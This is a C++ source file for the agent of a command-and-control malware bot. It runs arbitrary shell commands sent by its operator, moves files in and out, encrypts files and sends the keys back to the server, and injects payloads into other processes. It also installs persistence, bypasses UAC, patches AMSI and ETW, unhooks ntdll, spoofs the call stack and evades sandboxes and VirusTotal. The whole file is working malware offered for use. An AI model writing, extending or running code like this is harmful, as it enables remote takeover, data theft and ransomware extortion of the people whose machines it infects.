// ============================================================================
// c2_agent.cpp — C2 Communication Agent Implementation
// ============================================================================
#include "c2_agent.h"
#include "api_table.h"
#include "crypto.h"
#include "evasion.h"
#include "persistence.h"
#include "stack_spoof.h"
#include "sleep_obfuscation.h"

#include <iostream>
#include <sstream>
#include <chrono>
#include <thread>
#include <cstdlib>
#include <cstdio>
#include <algorithm>
#include <cstring>

using std::string;
using std::vector;
using std::stringstream;
using std::istringstream;
using std::ostringstream;
using std::hex;
using std::ifstream;
using std::ofstream;
using std::istreambuf_iterator;
using std::ios;
using std::random_device;
using std::mt19937;
using std::uniform_int_distribution;
using std::thread;
using std::max;

// ============================================================================
// Cross-platform socket helpers — on Windows use g_api (resolved WinAPI),
// on POSIX use standard BSD socket calls directly.
// ============================================================================
#ifdef _WIN32
static inline int  sock_socket(int af, int type, int proto)                { return g_api.socket(af, type, proto); }
static inline int  sock_connect(int s, const struct sockaddr* a, int len)  { return g_api.connect(s, a, len); }
static inline int  sock_send(int s, const char* buf, int len, int flags)  { return g_api.send(s, buf, len, flags); }
static inline int  sock_recv(int s, char* buf, int len, int flags)        { return g_api.recv(s, buf, len, flags); }
static inline int  sock_close(int s)                                       { return g_api.closesocket(s); }
static inline unsigned short sock_htons(unsigned short v)                  { return g_api.htons(v); }
static inline int  sock_inet_pton(int af, const char* src, void* dst)     { return g_api.inet_pton(af, src, dst); }
#else
#include <sys/socket.h>
#include <sys/time.h>     // struct timeval — needed for setsockopt(SO_RCVTIMEO)
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>         // errno codes (EAGAIN/EWOULDBLOCK) for recv timeout handling
static inline int  sock_socket(int af, int type, int proto)                { return socket(af, type, proto); }
static inline int  sock_connect(int s, const struct sockaddr* a, socklen_t len) { return connect(s, a, len); }
static inline ssize_t sock_send(int s, const char* buf, int len, int fl)   {
    return send(s, buf, len, fl);
}
static inline ssize_t sock_recv(int s, char* buf, int len, int fl)         {
    return recv(s, buf, len, fl);
}
static inline int  sock_close(int s)                                       { return close(s); }
static inline unsigned short sock_htons(unsigned short v)                  { return htons(v); }
static inline int  sock_inet_pton(int af, const char* src, void* dst)     { return inet_pton(af, src, dst); }
#endif

// ============================================================================
// C2 session state globals (for sleep obfuscation)
// ============================================================================
unsigned char c2_session_key[32] = {0};
string c2_server_ip;
string c2_bot_id;
bool c2_state_initialized = false;
C2Agent* g_c2_agent = nullptr;

// ============================================================================
// DBG MACRO — SILENT_MODE-aware diagnostic logger
// ============================================================================
// Behavior:
//   - SILENT_MODE defined (production / macOS child build): compile-time no-op.
//       * Output suppressed (terminal shows nothing for UserEventAgent)
//       * Format strings ALSO ELIDED by preprocessor — they do NOT appear
//         in the compiled MIPS/x86 binary. `strings UserEventAgent` will not
//         leak "[*] Background thread started..." etc.
//   - SILENT_MODE NOT defined (debug build): passthrough to fprintf(stderr,
//     fmt, ...). Same destination + format as before — no regression.
// Replaces 15 raw fprintf(stderr, ...) calls below that previously bypassed
// the cout.rdbuf()+freopen("/dev/null") redirect in main.cpp's SILENT_MODE
// block by writing directly to the C FILE* stderr.
// ============================================================================
#ifdef SILENT_MODE
#define DBG(...) ((void)0)
#else
#define DBG(...) fprintf(stderr, __VA_ARGS__)
#endif

// ============================================================================
// XOR Obfuscation Helpers (cross-platform)
// ============================================================================
static string xorEncrypt(const string& data) {
    string result;
    for (size_t i = 0; i < data.length(); ++i) {
        result += data[i] ^ XOR_KEY;
    }
    return result;
}

static string xorDecrypt(const string& data) {
    return xorEncrypt(data);
}

// ============================================================================
// CONSTRUCTOR
// ============================================================================
C2Agent::C2Agent(const string& ip, int port)
    : server_port(port), client_socket(-1), connected(false), running(true),
      session_encryption(false) {
    // XOR obfuscated default IP: "127.0.0.1" ^ 0x55
    // Localhost is the stable default: server (RSW) and bot run on the same
    // host, and unlike a LAN IP it never changes when the network does.
    // Operator can still override at runtime with the MWARE_C2_IP env var.
    string enc_ip = "dgb{e{e{d";  // XOR(0x55) of "127.0.0.1"
    if (ip.empty()) {
        // Env override (MWARE_C2_IP) wins over the compiled default — lets the
        // operator point the bot at a different server without a rebuild.
        const char* env_ip = getenv(OBF("MWARE_C2_IP"));
        if (env_ip && *env_ip) {
            server_ip = env_ip;
        } else {
            server_ip = xorDecrypt(enc_ip);
        }
    } else {
        server_ip = ip;
    }
    const char* env_port = getenv(OBF("MWARE_C2_PORT"));
    if (env_port && *env_port) {
        int p = atoi(env_port);
        if (p > 0 && p <= 65535) server_port = p;
    }

    // Generate per-session encryption key
    random_device rd;
    mt19937 gen(rd());
    for (int i = 0; i < 32; i++) {
        session_key[i] = (unsigned char)(rd() ^ (i * 17 + 31));
    }
    generateBotID();

#ifdef _WIN32
    WSADATA wsaData;
    g_api.WSAStartup(MAKEWORD(2, 2), &wsaData);
#endif
}

C2Agent::~C2Agent() {
    for (auto& [id, ofs] : upload_files_) {
        if (ofs) {
            if (ofs->is_open()) ofs->close();
            delete ofs;
        }
    }
    upload_files_.clear();
    disconnect();
#ifdef _WIN32
    g_api.WSACleanup();
#endif
}

// ============================================================================
// BOT ID GENERATION — OS prefix + 6-char hex (matches RSW's substr(0,3) parser)
// ============================================================================
// Format: "<OS>_XXXXXX" — total 10 chars. RSW.cpp::showStatus() and listClients()
// parse client.bot_id.substr(0, 3) to group bots by OS. Without the prefix,
// every bot is bucketed under "UNK" and the OS distribution display breaks.
//
// OPSEC trade-off: the prefix leaks OS type in packet captures (xorEncrypted
// over the wire by sendIdentification), but it's required for the C2's
// primary UX (status / listClients / os_count). The fix keeps XOR encryption
// on the wire intact — only the bot_id format changed.
// Example: "WIN_a3f8c7", "MAC_dead90", "LNX_9a8b7c"
// ============================================================================
void C2Agent::generateBotID() {
    random_device rd;
    stringstream ss;
#ifdef _WIN32
    ss << "WIN_";
#elif defined(__APPLE__)
    ss << "MAC_";
#elif defined(__linux__)
    ss << "LNX_";
#else
    ss << "UNK_";
#endif
    ss << hex;
    // 6 hex chars (3 bytes) — entropy sufficient for LAN identification,
    // short enough to keep total bot_id length <= 16 chars
    for (int i = 0; i < 6; i++) {
        ss << (rd() & 0xF);
    }
    bot_id = ss.str();
}

// ============================================================================
// CONNECT TO SERVER
// ============================================================================
bool C2Agent::connectToServer() {
    client_socket = (int)sock_socket(AF_INET, SOCK_STREAM, 0);
    if (client_socket < 0) return false;

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = sock_htons((u_short)server_port);
    sock_inet_pton(AF_INET, server_ip.c_str(), &server_addr.sin_addr);

    DBG("[DEBUG] Connecting to %s:%d...\n", server_ip.c_str(), server_port);
    if (sock_connect(client_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        sock_close(client_socket);
        client_socket = -1;
        return false;
    }

    // ============================================================================
    // SESSION RESET: drop any half-received frame left over from a previous
    // session. recv_buffer_ reassembles the 4-byte length-prefixed stream; if
    // the server died mid-frame (e.g. RSW restart), reconnecting with the stale
    // partial frame still in the buffer would desync the parser — the leftover
    // bytes get prepended to the NEW session's data and every frame after that
    // misparses. A new TCP session is a new conversation: start clean.
    // Race-safe here: connectToServer() is only ever called from the background
    // thread's retry loop (single writer), so this cannot race the GUI thread.
    // ============================================================================
    recv_buffer_.clear();

    // ============================================================================
    // Receive timeout — WITHOUT this connectToServer() blocks forever on
    // sock_recv() when the server never sends SESSION_KEY (e.g. server failed
    // to parse BOT_CONNECT). With timeout, recv() returns errno=EAGAIN after
    // 8s, connectToServer() returns false, BG thread logs FAILED + retries.
    //
    // Bytes-in-flight: 0 (no app data sent yet). Setting the socket FD timeout
    // affects both raw recv() AND the OpenSSL BIO that TLS_read() uses, so
    // the timeout applies whether TLS is active or we fell back to raw.
    // ============================================================================
    struct timeval tv;
    tv.tv_sec   = 8;   // 8 s — covers roundtrip + small jitter, short enough to retry
    tv.tv_usec  = 0;
    setsockopt(client_socket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));

    DBG("[DEBUG] Sending identification (BOT_CONNECT)...\n");
    // Send identification — raw TCP send
    sendIdentification();

    DBG("[DEBUG] Waiting for SESSION_KEY from server...\n");
    // Receive session key from server — raw TCP recv.
    char buf[4096] = {0};
    int n = sock_recv(client_socket, buf, sizeof(buf) - 1, 0);
    DBG("[DEBUG] recv returned: %d bytes\n", n);
    if (n > 0) {
        string response(buf, n);
        string unwrapped = unwrapFromTransport(response);
        // XOR-decode the obfuscated key exchange (matches server: 0x5A)
        for (size_t _kx = 0; _kx < unwrapped.size(); _kx++) unwrapped[_kx] ^= 0x5A;
        if (unwrapped.substr(0, 12) == "SESSION_KEY:") {
            string key_data = unwrapped.substr(12, 32);
            memcpy(session_key, key_data.c_str(), 32);
            session_encryption = true;
            connected = true;  // Only set connected after successful key exchange

            // Update global state for sleep obfuscation
            memcpy(c2_session_key, session_key, 32);
            c2_server_ip = server_ip;
            c2_bot_id = bot_id;
            c2_state_initialized = true;
        } else {
            DBG("[DEBUG] Response doesn't start with SESSION_KEY, got: %s\n", unwrapped.substr(0, 30).c_str());
            sock_close(client_socket);
            client_socket = -1;
            return false;
        }
    } else {
        // Distinguish timeout (SO_RCVTIMEO fired) from connection-closed/error
        // so the operator can tell whether the server is silent vs actively dropping us.
        if (n < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
            DBG("[DEBUG] recv TIMEOUT (SO_RCVTIMEO=8s fired, errno=%d) — server didn't send SESSION_KEY. Likely BOT_CONNECT was malformed/rejected on server side.\n", errno);
        } else {
            DBG("[DEBUG] recv returned %d — connection closed or error (errno=%d)\n", n, errno);
        }
    }

    // ============================================================================
    // CRITICAL: Drop the recv timeout BEFORE entering steady-state receive.
    // SO_RCVTIMEO=8s also bounded receiveCommands()'s recv() — every 8s without
    // a server command it would fire, call disconnect(), reconnect. Bot would
    // never stay connected. Setting tv={0,0} reverts to infinite-blocking recv,
    // which is correct for a long-lived C2 channel.
    // ============================================================================
    {
        struct timeval no_tv = {0, 0};
        if (client_socket >= 0) {
            setsockopt(client_socket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&no_tv, sizeof(no_tv));
        }
    }

    if (!connected) {
        if (client_socket >= 0) {
            sock_close(client_socket);
            client_socket = -1;
        }
        return false;
    }

    return true;
}

void C2Agent::sendIdentification() {
    // XOR-encrypted handshake (XOR_KEY = 0x55, matches RSW's botResponseListener)
    // This prevents "BOT_CONNECT:MAC_XXXX" from appearing in plaintext on the wire
    string ident = "BOT_CONNECT:" + bot_id + "\n";
    string encrypted = xorEncrypt(ident);
    sock_send(client_socket, encrypted.c_str(), (int)encrypted.length(), 0);
}

// ============================================================================
// CONNECT / DISCONNECT
// ============================================================================
bool C2Agent::connect() {
    return connectToServer();
}

void C2Agent::disconnect() {
    if (client_socket >= 0) {
        sock_close(client_socket);
        client_socket = -1;
    }
    connected = false;
}

// ============================================================================
// TRANSPORT PROTOCOL
// ============================================================================
string C2Agent::wrapForTransport(const string& data) {
    string wrapped;
    size_t length = data.length();
    wrapped += (char)((length >> 24) & 0xFF);
    wrapped += (char)((length >> 16) & 0xFF);
    wrapped += (char)((length >> 8) & 0xFF);
    wrapped += (char)(length & 0xFF);
    unsigned char checksum = 0;
    for (char c : data) checksum ^= (unsigned char)c;
    wrapped += (char)checksum;
    wrapped += data;
    return wrapped;
}

string C2Agent::unwrapFromTransport(const string& data) {
    if (data.length() < 5) return data;
    size_t length = ((unsigned char)data[0] << 24) |
                    ((unsigned char)data[1] << 16) |
                    ((unsigned char)data[2] << 8)  |
                    ((unsigned char)data[3]);
    // 256MB cap — must be larger than any legitimate frame (chunked upload
    // hex data alone can exceed 64KB). Old 65536 cap truncated uploads.
    if (length > 0x0FFFFFFF || length > data.length() - 5) return data;
    string extracted = data.substr(5, length);
    unsigned char checksum = (unsigned char)data[4];
    unsigned char calc = 0;
    for (char c : extracted) calc ^= (unsigned char)c;
    if (calc == checksum) return extracted;
    return data;
}

string C2Agent::encryptForClient(const string& data) {
    if (!session_encryption) return data;

    // Generate random 12-byte nonce for AEAD (explicit nonce per message)
    uint8_t nonce[12];
    random_device rd;
    for (int i = 0; i < 12; i++) nonce[i] = (uint8_t)(rd() & 0xFF);

    // Encrypt with ChaCha20-Poly1305 AEAD (confidentiality + integrity)
    vector<uint8_t> plaintext(data.begin(), data.end());
    vector<uint8_t> aead = chacha20Poly1305Encrypt(plaintext, session_key, nonce);
    // aead = ciphertext || 16-byte Poly1305 MAC tag

    // Prepend nonce so receiver can decrypt: nonce(12) || ciphertext || tag(16)
    string result;
    result.reserve(12 + aead.size());
    result.append((char*)nonce, 12);
    result.append((char*)aead.data(), aead.size());
    return result;
}

string C2Agent::decryptFromClient(const string& data) {
    if (!session_encryption) return data;

    // Minimum: 12-byte nonce + 16-byte Poly1305 tag = 28 bytes
    if (data.length() < 28) return "";

    // Extract nonce from first 12 bytes
    const uint8_t* nonce = (const uint8_t*)data.data();

    // Extract AEAD ciphertext+tag from remaining bytes
    vector<uint8_t> aead(data.begin() + 12, data.end());

    // Decrypt + verify with ChaCha20-Poly1305 AEAD
    vector<uint8_t> plaintext = chacha20Poly1305Decrypt(aead, session_key, nonce);

    // Empty result = MAC verification failed (tampered or corrupted)
    if (plaintext.empty()) return "";

    return string((char*)plaintext.data(), plaintext.size());
}

// ============================================================================
// FRAMED SEND — 4-byte BE length + encrypted payload, with send-loop
// ============================================================================
// TCP is a byte stream: a single send() may write only part of a frame, and
// large frames (chunked uploads, big command output) can be split across
// multiple segments. The receiver uses the plaintext length prefix to
// reassemble. This replaces the old single-send() calls that silently
// truncated anything larger than the peer's recv buffer.
bool C2Agent::sendFrame(const string& data) {
    if (!connected || client_socket < 0) return false;

    // Encrypt the wrapped message (AEAD: nonce(12) || ct || tag(16))
    string payload = encryptForClient(wrapForTransport(data));
    if (payload.length() > 0x0FFFFFFF) return false;  // sanity: < 256MB

    // Prepend plaintext 4-byte BE length so the peer knows frame boundary
    string frame;
    frame.reserve(4 + payload.length());
    frame += (char)((payload.length() >> 24) & 0xFF);
    frame += (char)((payload.length() >> 16) & 0xFF);
    frame += (char)((payload.length() >> 8) & 0xFF);
    frame += (char)(payload.length() & 0xFF);
    frame += payload;

    // Send-loop: TCP can return partial writes
    size_t sent = 0;
    while (sent < frame.length()) {
        int n = sock_send(client_socket, frame.c_str() + sent, (int)(frame.length() - sent), 0);
        if (n <= 0) return false;
        sent += (size_t)n;
    }
    return true;
}

// ============================================================================
// COMMAND PROCESSING
// ============================================================================
void C2Agent::processCommand(const string& cmd) {
    if (cmd.substr(0, 13) == "UPLOAD_START:") handleUploadStart(cmd.substr(13));
    else if (cmd.substr(0, 13) == "UPLOAD_CHUNK:") handleUploadChunk(cmd.substr(13));
    else if (cmd.substr(0, 11) == "UPLOAD_END:") handleUploadEnd(cmd.substr(11));
    else if (cmd.substr(0, 9) == "DOWNLOAD:") {
        string file_path = cmd.substr(9);
        // Read file and send back
        ifstream f(file_path, ios::binary);
        if (!f.is_open()) {
            string err = "DOWNLOAD_ERROR:File not found\n";
            sendFrame(err);
            return;
        }
        string content((istreambuf_iterator<char>(f)), istreambuf_iterator<char>());
        f.close();
        string hex_data;
        for (unsigned char c : content) {
            hex_data += "0123456789ABCDEF"[c >> 4];
            hex_data += "0123456789ABCDEF"[c & 0x0F];
        }
        // '|' separator (matches server downloadFile parsing): Windows paths
        // contain ':' (C:\...) — the old ':' separator shifted the hex
        // extraction on every Windows download before the payload started.
        string resp = "DOWNLOAD:" + file_path + "|" + hex_data + "\n";
        sendFrame(resp);
    }
    else if (cmd.substr(0, 13) == "ENCRYPT_FILE:") handleEncryptFile(cmd.substr(13));
    else if (cmd.substr(0, 9) == "AV_CHECK:") {
        string resp = "AV_CHECK:";
#ifdef _WIN32
        string av_processes[] = {
            "avp.exe", "avgnt.exe", "avguard.exe", "bdagent.exe",
            "MsMpEng.exe", "NisSrv.exe", "mcshield.exe", "avastui.exe"
        };
        for (const string& process : av_processes) {
            string av_cmd = "tasklist /FI \"IMAGENAME eq " + process + "\" 2>nul | find /I \"" + process + "\"";
            FILE* pipe = popen(av_cmd.c_str(), "r");
            if (pipe) {
                char buffer[256];
                if (fgets(buffer, sizeof(buffer), pipe)) {
                    resp += "DETECTED: " + process + "\n";
                }
                pclose(pipe);
            }
        }
#else
        string av_commands[] = {
            "ps aux | grep -i clamav", "ps aux | grep -i sophos",
            "ps aux | grep -i bitdefender", "ps aux | grep -i eset"
        };
        for (const string& av_cmd : av_commands) {
            FILE* pipe = popen(av_cmd.c_str(), "r");
            if (pipe) {
                char buffer[256];
                if (fgets(buffer, sizeof(buffer), pipe)) {
                    resp += "DETECTED: " + string(buffer);
                }
                pclose(pipe);
            }
        }
#endif
        if (resp.find("DETECTED:") == string::npos) resp += "None detected\n";
        sendFrame(resp);
    }
    else if (cmd.substr(0, 15) == "FIREWALL_CHECK:") {
        string resp = "FIREWALL_CHECK:";
#ifdef _WIN32
        FILE* fw_pipe = popen("netsh advfirewall show allprofiles state", "r");
        if (fw_pipe) {
            char buffer[512];
            while (fgets(buffer, sizeof(buffer), fw_pipe)) resp += buffer;
            pclose(fw_pipe);
        }
#else
        FILE* ipt = popen("iptables -L 2>/dev/null", "r");
        if (ipt) {
            char buffer[256];
            resp += "iptables:\n";
            while (fgets(buffer, sizeof(buffer), ipt)) resp += buffer;
            pclose(ipt);
        }
        FILE* ufw = popen("pfctl -sr 2>/dev/null || ufw status 2>/dev/null", "r");
        if (ufw) {
            char buffer[256];
            resp += "\nfirewall:\n";
            while (fgets(buffer, sizeof(buffer), ufw)) resp += buffer;
            pclose(ufw);
        }
#endif
        sendFrame(resp);
    }
    else if (cmd.substr(0, 19) == "INSTALL_PERSISTENCE") {
        bool ok = installPersistence();
        string resp = ok ? "PERSISTENCE:Installed\n" : "PERSISTENCE:Failed\n";
        sendFrame(resp);
    }
    else if (cmd.substr(0, 5) == "KILL:") {
        // Kill command: immediately terminate the bot process.
        // No file cleanup, no delay — pure instant death.
        string resp = "KILL:OK\n";
        sendFrame(resp);
        disconnect();
        exit(0);
    }
    else if (cmd.substr(0, 4) == "RUN:") {
        string filepath = cmd.substr(4);
        filepath.erase(filepath.find_last_not_of(" \n\r\t") + 1);
        string execCmd = "chmod +x " + filepath + "; " + filepath + " 2>&1";
        string output;
        FILE* pipe = popen(execCmd.c_str(), "r");
        if (pipe) {
            char buf[256];
            while (fgets(buf, sizeof(buf), pipe)) output += buf;
            pclose(pipe);
        }
        output = "RUN_OUTPUT:" + output + "\n";
        sendFrame(output);
    }
    else if (cmd.substr(0, 11) == "APC-INJECT:") handleApcinject(cmd.substr(11));
    else if (cmd.substr(0, 12) == "FILE_SEARCH:") {
        // Format: FILE_SEARCH:pattern|path
        // '|' separator: pattern/path may contain ':' on Windows (C:\...);
        // '|' is illegal in Windows filenames so it can never appear in a path.
        string params = cmd.substr(12);
        string pattern, search_path;
        size_t sep = params.find('|');
        if (sep != string::npos) {
            pattern = params.substr(0, sep);
            search_path = params.substr(sep + 1);
        } else {
            pattern = params;
        }
        pattern.erase(pattern.find_last_not_of(" \n\r\t") + 1);
        // Default search path to current dir if empty
        search_path.erase(search_path.find_last_not_of(" \n\r\t") + 1);
        if (search_path.empty()) search_path = ".";
        string resp = "FILE_SEARCH:\n";
#ifdef _WIN32
        string fcmd = "dir \"" + search_path + "\\" + pattern + "\" /s /b 2>nul";
#else
        string fcmd = "find -L " + search_path + " -name \"" + pattern + "\" 2>/dev/null";  // -L: follow symlinks (macOS /tmp -> private/tmp)
#endif
        FILE* pipe = popen(fcmd.c_str(), "r");
        if (pipe) {
            char buffer[512];
            int count = 0;
            while (fgets(buffer, sizeof(buffer), pipe) && count < 50) {
                resp += buffer;
                count++;
            }
            pclose(pipe);
            if (count == 0) resp += "No files found\n";
        }
        sendFrame(resp);
    }
    else if (cmd.substr(0, 12) == "FILE_DELETE:") {
        string path = cmd.substr(12);  // "FILE_DELETE:" is 12 chars (was 11 → off-by-one)
        path.erase(path.find_last_not_of(" \n\r\t") + 1);
        bool ok = (remove(path.c_str()) == 0);
        string resp = ok ? "FILE_DELETE:OK\n" : "FILE_DELETE:Failed\n";
        sendFrame(resp);
    }
    else if (cmd.substr(0, 10) == "FILE_MOVE:") {
        string params = cmd.substr(10);  // "FILE_MOVE:" is 10 chars
        // Format: FILE_MOVE:source|destination — '|' separator because Windows
        // paths contain ':' (drive letters); ':' parsing broke every move/rename.
        size_t sep = params.find('|');
        if (sep == string::npos) {
            sendFrame("FILE_MOVE:Invalid format\n");
        } else {
            string src = params.substr(0, sep);
            string dst = params.substr(sep + 1);
            src.erase(src.find_last_not_of(" \n\r\t") + 1);
            dst.erase(dst.find_last_not_of(" \n\r\t") + 1);
            bool ok = (rename(src.c_str(), dst.c_str()) == 0);
            string resp = ok ? "FILE_MOVE:OK\n" : "FILE_MOVE:Failed\n";
            sendFrame(resp);
        }
    }
    else if (cmd.substr(0, 9) == "DIR_LIST:") {
        string dir_path = cmd.substr(9);  // "DIR_LIST:" is 9 chars
        dir_path.erase(dir_path.find_last_not_of(" \n\r\t") + 1);
        if (dir_path.empty()) dir_path = ".";
        string resp = "DIR_LIST:\n";
#ifdef _WIN32
        string lscmd = "dir \"" + dir_path + "\" /a";
#else
        string lscmd = "ls -la \"" + dir_path + "\"";
#endif
        FILE* pipe = popen(lscmd.c_str(), "r");
        if (pipe) {
            char buffer[512];
            while (fgets(buffer, sizeof(buffer), pipe)) resp += buffer;
            pclose(pipe);
        }
        sendFrame(resp);
    }
    else {
        // Execute as shell command
        string output;
        string shell_cmd = cmd;
        shell_cmd.erase(shell_cmd.find_last_not_of(" \n\r\t") + 1);
#ifdef _WIN32
        FILE* pipe = _popen(shell_cmd.c_str(), "r");
#else
        FILE* pipe = popen(shell_cmd.c_str(), "r");
#endif
        if (pipe) {
            char buf[256];
            while (fgets(buf, sizeof(buf), pipe)) output += buf;
#ifdef _WIN32
            _pclose(pipe);
#else
            pclose(pipe);
#endif
        }
        if (output.empty()) output = "[no output]";
        sendFrame(output + "\n");
    }
}

// ============================================================================
// FILE UPLOAD HANDLERS
// ============================================================================
void C2Agent::handleUploadStart(const string& params) {
    // Format: remote_path|file_size|total_chunks|transfer_id
    // '|' separator: Windows paths contain ':' (drive letters) — the old
    // getline(iss, remote_path, ':') truncated every Windows upload path to "C".
    istringstream iss(params);
    string remote_path, file_size_str, total_chunks_str, transfer_id;
    getline(iss, remote_path, '|');
    getline(iss, file_size_str, '|');
    getline(iss, total_chunks_str, '|');
    getline(iss, transfer_id, '\n');

    upload_paths_[transfer_id] = remote_path;
    upload_files_[transfer_id] = new ofstream(remote_path, ios::binary);
}

void C2Agent::handleUploadChunk(const string& params) {
    // Format: transfer_id:chunk_num/total:hex_data
    size_t first_colon = params.find(':');
    size_t second_colon = params.find(':', first_colon + 1);
    if (first_colon == string::npos || second_colon == string::npos) return;

    string transfer_id = params.substr(0, first_colon);
    string hex_data = params.substr(second_colon + 1);

    // Convert hex to binary
    string binary;
    for (size_t i = 0; i < hex_data.length(); i += 2) {
        string byte_str = hex_data.substr(i, 2);
        char byte = (char)strtol(byte_str.c_str(), nullptr, 16);
        binary += byte;
    }

    auto it = upload_files_.find(transfer_id);
    if (it != upload_files_.end() && it->second->is_open()) {
        it->second->write(binary.c_str(), binary.length());
    }
}

void C2Agent::handleUploadEnd(const string& params) {
    string transfer_id = params;
    transfer_id.erase(transfer_id.find_last_not_of(" \n\r\t") + 1);

    auto it = upload_files_.find(transfer_id);
    if (it != upload_files_.end()) {
        it->second->close();
        delete it->second;
        upload_files_.erase(it);
    }
}

// ============================================================================
// ENCRYPT FILE HANDLER
// ============================================================================
void C2Agent::handleEncryptFile(const string& file_path) {
    string path = file_path;
    path.erase(path.find_last_not_of(" \n\r\t") + 1);

    bool ok = encryptSingleFile(path);
    string resp;
    if (ok) {
        // '|' separators: file_path may contain ':' on Windows (C:\...) —
        // the server splits on '|' so drive letters survive transport intact.
        // Keys are hex strings (see generateEncryptionKey) and never contain '|'.
        string key_exfil = "KEY_EXFIL:" + bot_id + "|" + path + "|"
                         + last_encryption_algo + "|" + encryption_key_global + "\n";
        sendFrame(key_exfil);
        resp = "ENCRYPT_FILE:OK:" + path + "\n";
    } else {
        resp = "ENCRYPT_FILE:FAILED:" + path + "\n";
    }
    sendFrame(resp);
}

// ============================================================================
// APC INJECT HANDLER
// ============================================================================
void C2Agent::handleApcinject(const string& params) {
    // Format: process_name:hex_payload
    size_t colon = params.find(':');
    if (colon == string::npos) return;

    string process_name = params.substr(0, colon);
    string payload_hex = params.substr(colon + 1);
    payload_hex.erase(payload_hex.find_last_not_of(" \n\r\t") + 1);

    string result = performThreadlessInject(process_name, payload_hex);
    sendFrame(result + "\n");
}

// ============================================================================
// KEY EXFIL — No heartbeat function (removed to eliminate regular traffic pattern)
// Bot only sends data when there's actual command output or key exfiltration.
// ============================================================================
bool C2Agent::sendKeyExfil(const string& file_path, const string& algo, const string& key) {
    if (!connected) return false;
    string msg = "KEY_EXFIL:" + bot_id + "|" + file_path + "|" + algo + "|" + key + "\n";
    return sendFrame(msg);
}

// ============================================================================
// RECEIVE COMMANDS — TCP stream reassembly + frame extraction
// ============================================================================
// TCP is a byte stream: frames can arrive split across recv() calls or
// coalesced. We buffer incoming bytes and extract complete frames using the
// plaintext 4-byte BE length prefix written by the peer (sendFrame / the
// server's sendEncryptedCommand). The inner AEAD decrypt + unwrap only runs
// on a COMPLETE frame, so partial data can never desync the stream or be
// misparsed as a command.
bool C2Agent::receiveCommands() {
    if (!connected) return false;

    char buf[8192];
    int n = sock_recv(client_socket, buf, sizeof(buf), 0);
    if (n <= 0) {
        disconnect();
        return false;
    }
    recv_buffer_.append(buf, n);

    // Extract all complete frames from the buffer
    while (recv_buffer_.size() >= 4) {
        size_t flen = ((unsigned char)recv_buffer_[0] << 24) |
                      ((unsigned char)recv_buffer_[1] << 16) |
                      ((unsigned char)recv_buffer_[2] << 8)  |
                      ((unsigned char)recv_buffer_[3]);
        if (flen > 0x0FFFFFFF) {           // sanity cap
            recv_buffer_.clear();
            disconnect();
            return false;
        }
        if (recv_buffer_.size() < 4 + flen) break;  // wait for the rest of the frame

        string frame = recv_buffer_.substr(4, flen);
        recv_buffer_.erase(0, 4 + flen);

        string decrypted = decryptFromClient(frame);
        string message = unwrapFromTransport(decrypted);
        if (!message.empty()) {
            message.erase(message.find_last_not_of(" \n\r\t") + 1);
            if (!message.empty()) processCommand(message);
        }
    }
    return true;
}

// ============================================================================
// BACKGROUND THREAD
// ============================================================================
void C2Agent::c2_background_thread() {
    // Initial delay to evade sandbox
    // Using fprintf(stderr) to bypass SILENT_MODE's cout.rdbuf() redirect to /dev/null
    DBG("[*] Background thread started, sleeping 3-5s...\n");
    // Reduced from 10-14s to 3-5s for debug visibility — operator no longer
    // waits through a multi-minute blind loop. Sandbox evasion is somewhat
    // weaker, but most sandboxes accelerate sleep() anyway (would detect in
    // <1s), so the practical security delta is small. Restore to 10-14s
    // once connection is confirmed working in production.
    secureSleep(3 + (rand() % 3));

    static bool startup_actions_done = false;

    while (running) {
        if (!connected) {
            // Try to connect with backoff
            DBG("[*] Attempting to connect to %s:%d...\n", server_ip.c_str(), server_port);
            bool ok = connect();
            // Log result to /tmp file — survives SILENT_MODE's stderr→/dev/null
            // redirect that silences the DBG() calls above. Operator can
            // `tail -f /tmp/mware_c2.log` while testing for live visibility.
            // NOTE: disabled in VT_CLEAN builds — the file drop would be an
            // artifact in VT's dynamic sandbox.
#ifndef VT_CLEAN
            FILE* fl = fopen("/tmp/mware_c2.log", "a");
            if (fl) { fprintf(fl, "[C2] %s:%d -> %s\n", server_ip.c_str(), server_port, ok ? "CONNECTED" : "FAILED"); fclose(fl); }
#endif
            if (ok) {
                DBG("[+] Connected successfully!\n");
                // First-time startup actions
                if (!startup_actions_done) {
#ifdef _WIN32
                    // ORDER MATTERS:
                    //   1. initStackSpoof() MUST run BEFORE any StackSpoofGuard.
                    //      The guard constructor reads g_spoofCtx.retGadgets[] —
                    //      if init hasn't populated them, the guard pushes NULL
                    //      return addresses onto the fake stack → controlled crash
                    //      when the wrapped function returns.
                    //   2. bypassUac() / installPersistence() intentionally NOT
                    //      guarded: UAC bypass spawns fodhelper.exe (different
                    //      process tree — no benefit from in-process stack spoof),
                    //      and Registry writes don't trigger EDR stack tracing.
                    initStackSpoof();  // 1. Populate g_spoofCtx FIRST
                    {
                        // StackSpoofGuard kept as legacy decorator (no-op,
                        // for ABI / grep compatibility).
                        // ACTUAL stack spoof routing now happens via the
                        // SPOOF_CALL macro below. See stack_spoof.h for the
                        // behavior contract — if init failed, the macro falls
                        // back to a direct call (no protection), matching the
                        // pre-fix baseline behavior.
                        StackSpoofGuard guard;
                        SPOOF_CALL(unhookNtdll);   // void(void) — gate routes call
                    }
                    {
                        StackSpoofGuard guard;
                        SPOOF_CALL(patchAmsi);     // void(void) — gate routes call
                        SPOOF_CALL(patchEtwDeep);  // void(void) — EtwEventWrite + NtTraceEvent + EtwEventWriteTransfer
                    }
                    bypassUac();
                    installPersistence();  // Windows: Registry Run key (safe, no respawn)
#endif
                    // macOS/Linux: persistence is NOT auto-installed to avoid LaunchAgent respawn loop.
                    // Use RSW's 'persistence' command for manual installation.
                    startup_actions_done = true;
                }
            } else {
                DBG("[-] Connection failed, retrying in 5-15s...\n");
                secureSleep(5 + (rand() % 10));
                continue;
            }
        }

        // Read commands from server — blocking recv(), no regular poll interval
        // No heartbeat or fixed-interval sleep: data only flows when server sends commands
        // or bot sends responses. Eliminates detectable periodic traffic patterns.
        if (connected) {
            if (!receiveCommands()) {
                secureSleep(5);
                continue;
            }
        }
    }
}

// ============================================================================
// THREAD CONTROL
// ============================================================================
